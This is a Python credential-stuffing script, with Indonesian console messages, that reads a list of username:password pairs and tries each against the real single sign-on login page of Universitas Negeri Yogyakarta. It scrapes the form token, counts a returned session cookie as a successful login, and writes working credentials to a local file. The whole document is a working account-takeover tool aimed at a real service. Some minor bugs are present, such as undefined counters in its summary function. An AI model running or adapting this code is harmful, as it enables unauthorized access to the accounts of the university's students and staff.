import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
    os.system('clear')
except:
    os.system('pip install --upgrade pip')
    os.system('pip install requests bs4')
    os.system('clear')
    exit('Install bahan selesai\nSilahkan restart script')
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname()
    me = rv.release
    ok = []
    no = []
    logo = f"""
{green}.##..##..##..##..##..##.{cyan}..####....####....####...##..##.
{green}.##..##..###.##...####..{cyan}.##......##..##..##..##..###.##.
{green}.##..##..##.###....##..{cyan}...####...##......######..##.###.
{green}.##..##..##..##....##....{cyan}....##..##..##..##..##..##..##.
{green}..####...##..##....##..{cyan}...####....####...##..##..##..##.
{green}............................{cyan}............................
{blue}================================================={off}
.##..##..........#####....####...##..##..######.
..####...######..##..##..##..##..###.##.....##..
...##............#####...######..##.###....##...
..####...######..##..##..##..##..##..##...##....
.##..##..........##..##..##..##..##..##..######.   
................................................
{blue}================================================={off}
"""

    def uny(i, usr, pwd):
        ses = req.Session()
        url = 'https://sso.uny.ac.id/login'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')
        dat = {'username':usr,  'password':pwd, 
         'execution':tok[2]['value'], 
         '_eventId':'submit',
         'submit':'submit'}
        res = ses.post(url, data=dat).headers
        try:
            mantap = res['Set-Cookie']
            print(f"{off}[{green}found{off}] {green}{usr}{off}:{green}{pwd}")
            time.sleep(0.001)
            ok.append(f"{usr}:{pwd}")
            with open('hasil_uny.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        except KeyError:
            print(f"{off}[{red}error{off}] {red}{usr}{off}:{red}{pwd}")
            time.sleep(0.001)
            
            
    def done():
        print(f"\n{cyan}>> {white}[{green}Live:{len(found)}{white}] {purple}|{white} [{red}die:{len(error)}{white}]")
        print(f"{cyan}>>{white} Akun aktif tersimpan di {white}itb.txt{off}")


    def main():
        try:
            path = input(logo + f"\n{green}[{cyan}+{green}] {white}Input list > ")
            with open(path, 'r') as (f):
                lines = f.readlines()
                count = 1
                print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
                for line in lines:
                    data = line.strip()
                    user = data.split(':')[0]
                    pswd = data.split(':')[1]
                    if len(data) > 0:
                        uny(count, user, pswd)
                        count += 1
                        continue

            done()

        except KeyboardInterrupt:
            exit(f"\n{red}>> {white}Keluar script")
        except FileNotFoundError:
            exit(f"{red}>> {white}File tidak ditemukan")
        except IndexError:
            exit(f"{red}>> {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                print(f"\n{cyan}>> {white}[{green}found:{len(ok)}{white}] {purple}|{white} [{red}error:{len(no)}{white}]")
                print(f"{purple}>>{white} Akun aktif tersimpan")
                print(f"{green}[{cyan}?{green}] {off}Scan lagi? y/n")
                inv = input(f"{green}> {off}Pilih : ")
                if inv == 'y':
                	os.system('clear')
                	main()
                else:
                	exit()
            finally:
                e = None
                del e


    if __name__ == '__main__':
        main()
